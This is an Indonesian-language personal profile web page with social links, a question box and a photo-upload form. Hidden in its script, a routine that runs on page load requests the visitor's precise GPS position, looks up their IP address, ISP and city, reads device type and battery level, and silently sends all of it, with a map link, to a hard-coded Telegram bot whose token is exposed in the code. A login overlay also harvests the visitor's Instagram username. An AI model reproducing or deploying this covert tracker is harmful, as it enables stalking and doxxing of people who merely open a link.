<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>im4mdv</title>
  <style>
    :root{--bg:#0b0b0d;--card:#111214;--muted:#9aa0a6;--accent:#c56cff}
    *{box-sizing:border-box}
    body{
      margin:0;font-family:Inter,system-ui,Arial,sans-serif;
      background:linear-gradient(180deg,#050507 0%, #0b0b0d 100%);
      color:#fff;min-height:100vh;display:flex;align-items:center;
      justify-content:center;padding:24px
    }
    .wrap{width:100%;max-width:760px}
    .card{
      background:rgba(17,18,20,0.75);
      backdrop-filter:blur(10px);
      border-radius:14px;padding:28px;
      box-shadow:0 6px 20px rgba(0,0,0,0.6);
      border:1px solid rgba(255,255,255,0.08);
      transition:transform 0.3s ease, box-shadow 0.3s ease;
    }
    .card:hover{transform:translateY(-3px);box-shadow:0 8px 24px rgba(0,0,0,0.7)}
    .head{display:flex;gap:16px;align-items:center;justify-content:space-between}
    .avatar img{width:84px;height:84px;border-radius:14px;object-fit:cover}
    h1{
      margin:0;font-size:22px;
      background:linear-gradient(90deg,#c56cff,#4cc9ff);
      -webkit-background-clip:text;
      -webkit-text-fill-color:transparent;
    }
    .right-info{
      display:flex;
      flex-direction:column;
      gap:6px;
      position:relative;
    }
    p.tag{margin:0;color:var(--muted)}
    .musicBtn{
      background:rgba(30,144,255,0.25);
      color:#fff;
      border:1px solid rgba(255,255,255,0.3);
      border-radius:8px;
      padding:4px 8px;
      font-size:12px;
      cursor:pointer;
      backdrop-filter:blur(6px);
      display:inline-block;
      opacity:0;
      transform:translateY(10px);
      transition:all 0.4s ease;
      margin-top:6px;
      width:max-content;
    }
    .musicBtn.show{opacity:1;transform:translateY(0)}
    .musicBtn:hover{background:rgba(76,201,255,0.35);transform:translateY(-2px) scale(1.05)}
    .btns{display:flex;flex-direction:column;gap:12px;margin-top:18px}
    .btn{
      display:flex;align-items:center;gap:12px;padding:12px 14px;
      background:rgba(255,255,255,0.03);
      border:1px solid rgba(255,255,255,0.06);
      border-radius:10px;color:#fff;text-decoration:none;cursor:pointer;
      transition:all 0.2s ease;
    }
    .btn small{color:var(--muted);font-size:13px;margin-left:auto}
    .btn:hover{border-color:rgba(197,108,255,0.5);box-shadow:0 0 12px rgba(197,108,255,0.3);transform:translateY(-3px)}
    .btn:active{transform:scale(0.97);background:rgba(255,255,255,0.1)}
    .music{margin-top:18px;border:1px solid rgba(255,255,255,0.05);
           border-radius:12px;padding:16px;text-align:center}
    .note{color:var(--muted);font-size:13px;margin-top:12px}
    .footer{margin-top:18px;color:var(--muted);font-size:13px;text-align:center}
    input,textarea{width:100%;padding:10px;border-radius:8px;
                   background:#060607;border:1px solid rgba(255,255,255,0.05);
                   color:#fff}
    textarea::placeholder{color:rgba(255,255,255,0.4)}
    .modal{position:fixed;inset:0;display:flex;align-items:center;
           justify-content:center;background:rgba(0,0,0,0.6);
           visibility:hidden;opacity:0;transition:0.18s}
    .modal.show{visibility:visible;opacity:1}
    .panel{background:#0b0b0d;padding:16px;border-radius:10px;
           width:90%;max-width:520px;border:1px solid rgba(255,255,255,0.04)}
    .panel::before{
      content:"";display:block;height:4px;width:60px;
      background:var(--accent);border-radius:4px;margin:0 auto 12px;opacity:0.8;
    }
    .tiny{font-size:12px;color:var(--muted)}
    /* overlay login */
    #blurOverlay{
      position:fixed;inset:0;
      backdrop-filter:blur(8px);
      background:rgba(0,0,0,0.55);
      display:flex;align-items:center;
      justify-content:center;
      z-index:999999;
    }
    /* small status badge */
    #igStatus{
      position:fixed;bottom:12px;left:14px;
      background:rgba(255,255,255,0.08);
      color:#c5c5c5;font-size:13px;border-radius:8px;
      padding:6px 10px;z-index:99999;
      font-family:monospace;cursor:pointer;display:none;
    }
    /* responsive tweaks */
    @media (max-width:520px){
      .head{flex-direction:row;gap:12px}
      .avatar img{width:68px;height:68px}
    }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card">
      <div class="head">
        <div class="avatar">
          <img src="https://i.imgur.com/S1gkBZn.jpeg" alt="im4mdv">
        </div>
        <div class="right-info">
          <h1>sybau calm</h1>
          <p class="tag">sharing vibes & question üåê</p>
          <!-- Musik button di dalam kolom kanan nama -->
          <button id="musicButton" class="musicBtn">üëâüèªüëàüèªklik dulu</button>
        </div>
      </div>

      <div class="btns">
        <a class="btn" href="https://www.tiktok.com/@koplingterus" target="_blank">
           üì± TikTok<small>@koplingterus</small></a>
        <a class="btn" href="https://open.spotify.com/user/31ekkvvirtytc24a46swumscuv3e?si=NNMZyh0WTnSdYnOnh23jPQ" target="_blank">
           üé∏Spotify<small>spotify.link/Djt4Dj7BvXb</small></a>
        <button class="btn" id="openAsk">üì¨ Pertanyaan/Question</button>
      </div>

      <div class="music">
        <h3>üñºÔ∏èKirim foto?</h3>
        <p class="note">Unggah foto yang akan dikirimüì®</p>
        <button class="btn" id="takePhoto" style="margin-bottom:8px;"> üì∏Ambil Foto</button>
        <input type="file" id="photoInput" accept="image/*">
        <img id="photoPreview" style="display:none;margin-top:10px;width:100%;border-radius:8px;">
        <textarea id="caption" rows="2" placeholder="Tulis pesan ya!"></textarea>
        <button class="btn" id="sendPhoto" style="margin-top:8px;">üì® Kirim Foto</button>
        <div id="status" class="note"></div>
      </div>

      <div class="footer">stay calm</div>
    </div>
  </div>

  <!-- Modal Kirim Pertanyaan -->
  <div class="modal" id="modal">
    <div class="panel">
      <h3>üìú Kirim pertanyaan</h3>
      <p class="tiny">Mau bertanya tentang aku?</p>
      <textarea id="qtext" rows="4" placeholder="Tulis pertanyaan kamu..." required></textarea>
      <div style="display:flex;gap:8px;margin-top:8px">
        <button id="sendQ" class="btn">Kirim</button>
        <button id="closeQ" class="btn">Batal</button>
      </div>
      <div id="qmsg" class="tiny" style="margin-top:8px"></div>
    </div>
  </div>

  <!-- Overlay login -->
  <div id="blurOverlay">
    <div style="
      background:rgba(20,20,20,0.85);
      border:1px solid rgba(255,255,255,0.1);
      border-radius:20px;
      padding:25px;
      width:85%;max-width:340px;
      text-align:center;color:#fff;">
      <h3>Masukkan Username Instagram</h3>
      <input id="igInput" type="text" placeholder="@username" style="
        width:90%;padding:10px;border-radius:10px;border:none;
        background:rgba(255,255,255,0.1);
        color:#fff;text-align:center;font-size:15px;outline:none;">
      <button id="igSubmit" style="
        margin-top:15px;background:#4cc9ff;border:none;
        padding:10px 20px;border-radius:10px;
        color:#000;font-weight:bold;cursor:pointer;">Lanjut</button>
    </div>
  </div>

  <div id="igStatus"></div>

  <audio id="bgmusic"
    src="https://hipstrumentals.com/wp-content/uploads/2025/07/Lil-Peep-Ft.-rainy-bear-nuts-Instrumental-Prod.-By-Willie-G.mp3"
    preload="auto" muted></audio>

  <div id="visitorInfo" style="display:none;"></div>

  <script>
    // ---------- Konfigurasi ----------
    const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
    const CHAT_ID = "6864694275";

    // ---------- Musik ----------
    const music = document.getElementById('bgmusic');
    const btnMusic = document.getElementById('musicButton');
    let started = false;
    music.volume = 0.4;

    async function startMusic() {
      if (started) return;
      started = true;
      music.muted = false;
      try {
        await music.play();
        // jika autoplay berhasil, sembunyikan tombol
        btnMusic.classList.remove("show");
      } catch (err) {
        // jika gagal autoplay (browser blocking), tampilkan tombol untuk user tap
        btnMusic.classList.add("show");
      }
    }

    // trigger awal: coba autoplay sekali saat interaksi pertama (klik/touch)
    document.addEventListener('click', startMusic, { once: true });
    document.addEventListener('touchstart', startMusic, { once: true });

    // klik tombol musik -> play manual
    btnMusic.addEventListener('click', async () => {
      try {
        await music.play();
        btnMusic.classList.remove("show");
      } catch (e) {
        console.log("Gagal mulai musik", e);
      }
    });

    // ---------- Modal Kirim Pertanyaan ----------
    const modal = document.getElementById('modal');
    const openAskBtn = document.getElementById('openAsk');
    const closeQBtn = document.getElementById('closeQ');
    openAskBtn.addEventListener('click', () => modal.classList.add('show'));
    closeQBtn.addEventListener('click', () => modal.classList.remove('show'));

    // ---------- Login Overlay ----------
    const overlay = document.getElementById("blurOverlay");
    const input = document.getElementById("igInput");
    const btnLogin = document.getElementById("igSubmit");
    const savedIG = localStorage.getItem("ig_user");

    function removeOverlay() {
      if (!overlay) return;
      overlay.style.transition = "opacity 0.3s ease";
      overlay.style.opacity = "0";
      overlay.style.pointerEvents = "none";
      setTimeout(() => {
        overlay.style.display = "none";
        if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
      }, 300);
    }

    function showUserStatus(name) {
      const el = document.getElementById("igStatus");
      el.textContent = `üëâüèªLogin sebagai ${name} (keluar)`;
      el.style.display = "block";
      el.onclick = () => {
        if (confirm("Keluar dan hapus username?")) {
          localStorage.removeItem("ig_user");
          el.textContent = "üëâüèªLogout...";
          setTimeout(() => location.reload(), 600);
        }
      };
    }

    if (savedIG) {
      removeOverlay();
      showUserStatus(savedIG);
    }

    btnLogin.onclick = async () => {
      const username = input.value.trim();
      if (!username) { alert("Masukkan username dulu"); return; }
      localStorage.setItem("ig_user", username);
      showUserStatus(username);
      removeOverlay();

      // Kirim notif login ke Telegram (opsional)
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `üëâüèª Username login: ${username}`,
          }),
        });
      } catch (e) { console.log("Gagal kirim ke Telegram", e); }
    };

    // ---------- Kirim Pertanyaan (modal) ----------
    document.getElementById('sendQ').addEventListener('click', async () => {
      const savedUser = localStorage.getItem("ig_user") || "Anonim";
      const text = document.getElementById('qtext').value.trim();
      const qmsg = document.getElementById('qmsg');
      if (!text) { qmsg.textContent = "Isi pertanyaan dulu."; return; }
      qmsg.textContent = "Mengirim ...";
      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: CHAT_ID, text: ` Pertanyaan dari ${savedUser}\n${text}` })
        });
        qmsg.textContent = res.ok ? "‚úÖ Terkirim!" : "üòÆ‚Äçüí® Gagal.";
        if (res.ok) setTimeout(() => modal.classList.remove('show'), 1000);
      } catch (e) { qmsg.textContent = "Cek koneksi."; }
    });

    // ---------- Ambil Foto (kamera) & Preview ----------
    const takeBtn = document.getElementById("takePhoto");
    const photoInput = document.getElementById("photoInput");
    const preview = document.getElementById("photoPreview");

    takeBtn.onclick = async () => {
      try {
        const cameraInput = document.createElement("input");
        cameraInput.type = "file";
        cameraInput.accept = "image/*";
        cameraInput.capture = "user";
        cameraInput.click();
        cameraInput.onchange = () => {
          if (cameraInput.files.length > 0) {
            photoInput.files = cameraInput.files;
            const reader = new FileReader();
            reader.onload = (e) => {
              preview.src = e.target.result;
              preview.style.display = "block";
            };
            reader.readAsDataURL(cameraInput.files[0]);
          }
        };
      } catch (e) { alert("Kamera tidak tersedia"); }
    };

    // Jika user pilih file lewat input biasa, tampilkan preview juga
    photoInput.addEventListener('change', () => {
      if (photoInput.files && photoInput.files[0]) {
        const reader = new FileReader();
        reader.onload = (e) => {
        };
        reader.readAsDataURL(photoInput.files[0]);
      }
    });

    // ---------- Kirim Foto ke Telegram ----------
    document.getElementById("sendPhoto").addEventListener('click', async () => {
      const savedUser = localStorage.getItem("ig_user") || "Anonim";
      const fileInput = document.getElementById("photoInput");
      const file = fileInput.files && fileInput.files[0];
      const caption = document.getElementById("caption").value;
      const statusEl = document.getElementById("status");
      if (!file) { statusEl.textContent = "Pilih foto dulu."; return; }

      const fd = new FormData();
      fd.append("chat_id", CHAT_ID);
      fd.append("caption", `üñïüèª Foto dari ${savedUser}\n${caption}`);
      fd.append("photo", file);

      statusEl.textContent = "Mengirimüì® ...";
      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
        if (res.ok) {
          statusEl.textContent = "üíå Terkirim!";
          fileInput.value = "";
          document.getElementById("caption").value = "";
          preview.style.display = "none";
          setTimeout(() => { statusEl.textContent = ""; }, 2500);
        } else statusEl.textContent = "üíî Gagal.";
      } catch (e) { statusEl.textContent = "üòø Koneksi lemah."; }
    });
    
    // ---------- Info Pengunjung (Hybrid + Lokasi Tetap Backup) ----------
async function showVisitorInfo() {
  const savedUser = localStorage.getItem("ig_user") || "Anonim";

  // fungsi pengirim ke Telegram
  async function sendToTelegram(d, latitude, longitude, source = "Unknown") {
    try {
      const now = new Date();

      // lokasi fix Getasrejo
      const fixedAddress = "WWM9+J39 Getasrejo, Kabupaten Grobogan, Jawa Tengah";
      const fixedMap = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(fixedAddress)}&z=17`;

      // lokasi aktual (kalau ada)
      const mapLink = (latitude && longitude)
        ? `https://www.google.com/maps?q=${latitude},${longitude}&z=17`
        : fixedMap;

      const device = /mobile/i.test(navigator.userAgent) ? "üì± Mobile" : "üñ•Ô∏è Desktop";
      const os = /Windows/i.test(navigator.userAgent) ? "Windows" :
                 /Android/i.test(navigator.userAgent) ? "Android" :
                 /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS" :
                 /Mac/i.test(navigator.userAgent) ? "MacOS" :
                 /Linux/i.test(navigator.userAgent) ? "Linux" : "Unknown";

      let batteryInfo = "Tidak diketahui";
      try {
        const battery = await navigator.getBattery();
        batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "‚ö°" : "üîã"})`;
      } catch {}

      const msg = `üì¢ Pengunjung Baru!
üë§ ${savedUser}
üåé ${d.city || "?"}, ${d.country || d.country_name || "?"}
üó∫Ô∏è Maps: ${mapLink}
üíª ${device}
üß© OS: ${os}
üîã Baterai: ${batteryInfo}
üè∑Ô∏è ISP: ${d.connection?.isp || d.org || "?"}
üì° IP: ${d.ip || "?"}
üìç Sumber Lokasi: ${source}
üïì ${now.toLocaleString('id-ID')}`;

      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: msg,
          disable_web_page_preview: false
        })
      });

      if (!res.ok) console.error("‚ùå Telegram API error:", await res.text());
      else console.log("‚úÖ Info pengunjung terkirim.");
    } catch (err) {
      console.error("‚ùå Gagal kirim info pengunjung:", err);
    }
  }

  // ambil lokasi GPS
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const { latitude, longitude } = pos.coords;
        try {
          const r = await fetch("https://ipwho.is/");
          const d = await r.json();
          sendToTelegram(d, latitude, longitude, "GPS");
        } catch {
          sendToTelegram({}, latitude, longitude, "GPS");
        }
      },
      async () => {
        // fallback ke IP-based
        try {
          const r = await fetch("https://ipwho.is/");
          const d = await r.json();
          sendToTelegram(d, d.latitude, d.longitude, "IP-based");
        } catch {
          // terakhir: kirim lokasi tetap (Getasrejo)
          sendToTelegram({}, null, null, "Fixed");
        }
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  } else {
    // jika browser tidak dukung geolocation
    try {
      const r = await fetch("https://ipwho.is/");
      const d = await r.json();
      sendToTelegram(d, d.latitude, d.longitude, "No GPS");
    } catch {
      sendToTelegram({}, null, null, "Fixed");
    }
  }
}

showVisitorInfo();

    // ---------- Inisialisasi: coba autoplay (tanpa user tap) setelah delay kecil ----------
    // (berguna di beberapa browser: beri waktu layout stabil)
    setTimeout(() => {
      // startMusic akan menampilkan tombol jika autoplay diblokir
      startMusic();
    }, 700);
  </script>
</body>
<style>
  .butterfly {
    position: absolute;
    font-size: 22px;
    color: #6fd3ff;
    opacity: 0.85;
    pointer-events: none;
    user-select: none;
    z-index: 9;
    will-change: transform;
    filter: drop-shadow(0 0 4px rgba(100, 200, 255, 0.3));
    transition: transform 0.1s ease;
  }
</style>

<script>
  const area = document.querySelector('.card');
  const butterflies = [];
  const butterflyCount = 5;
  let holdActive = false;
  let holdX = 0;
  let holdY = 0;

  area.style.position = 'relative';
  area.style.overflow = 'hidden';

  function getBounds() {
    const rect = area.getBoundingClientRect();
    return { width: area.clientWidth, height: area.clientHeight, left: rect.left, top: rect.top };
  }

  const bounds = getBounds();

  // buat kupu-kupu
  for (let i = 0; i < butterflyCount; i++) {
    const b = document.createElement("div");
    b.className = "butterfly";
    b.textContent = "üí∏";
    area.appendChild(b);

    butterflies.push({
      el: b,
      x: Math.random() * bounds.width,
      y: Math.random() * bounds.height,
      vx: (Math.random() - 0.5) * 1.2,
      vy: (Math.random() - 0.5) * 1.2,
      size: 16 + Math.random() * 10,
      flapOffset: Math.random() * Math.PI * 2 // buat sayap mengepak
    });

    b.style.fontSize = butterflies[i].size + "px";
  }

  function moveButterflies() {
    const rect = getBounds();
    const time = performance.now() / 200;

    butterflies.forEach(b => {
      // gaya gravitasi ringan
      b.vy += 0.002;

      // gaya tarik ke arah klik/tap
      if (holdActive) {
        const dx = holdX - b.x;
        const dy = holdY - b.y;
        b.vx += dx * 0.002;
        b.vy += dy * 0.002;
      }

      // variasi arah halus (melayang)
      b.vx += Math.sin(time + b.flapOffset) * 0.04;
      b.vy += Math.cos(time + b.flapOffset) * 0.02;

      b.x += b.vx;
      b.y += b.vy;

      // pantulan di tepi
      if (b.x <= 0 || b.x >= rect.width - b.size) b.vx *= -0.8;
      if (b.y <= 0 || b.y >= rect.height - b.size) b.vy *= -0.8;

      // batas kecepatan
      b.vx = Math.max(-1.8, Math.min(1.5, b.vx));
      b.vy = Math.max(-1.8, Math.min(1.8, b.vy));

      // animasi mengepak sayap
      const flap = Math.sin(time * 8 + b.flapOffset) * 20; // sudut rotasi sayap

      b.el.style.left = b.x + "px";
      b.el.style.top = b.y + "px";
      b.el.style.transform = `rotate(${flap}deg) scale(${1 + Math.sin(time * 4 + b.flapOffset) * 0.05})`;
    });

    requestAnimationFrame(moveButterflies);
  }

  moveButterflies();

  // event interaksi
  const startHold = (x, y) => {
    const rect = getBounds();
    holdActive = true;
    holdX = x - rect.left;
    holdY = y - rect.top;
  };

  const moveHold = (x, y) => {
    if (holdActive) {
      const rect = getBounds();
      holdX = x - rect.left;
      holdY = y - rect.top;
    }
  };

  const endHold = () => holdActive = false;

  area.addEventListener('mousedown', e => startHold(e.clientX, e.clientY));
  area.addEventListener('mousemove', e => moveHold(e.clientX, e.clientY));
  area.addEventListener('mouseup', endHold);
  area.addEventListener('mouseleave', endHold);

  area.addEventListener('touchstart', e => {
    const t = e.touches[0];
    startHold(t.clientX, t.clientY);
  });
  area.addEventListener('touchmove', e => {
    const t = e.touches[0];
    moveHold(t.clientX, t.clientY);
  });
  area.addEventListener('touchend', endHold);
  area.addEventListener('touchcancel', endHold);
</script>

</html>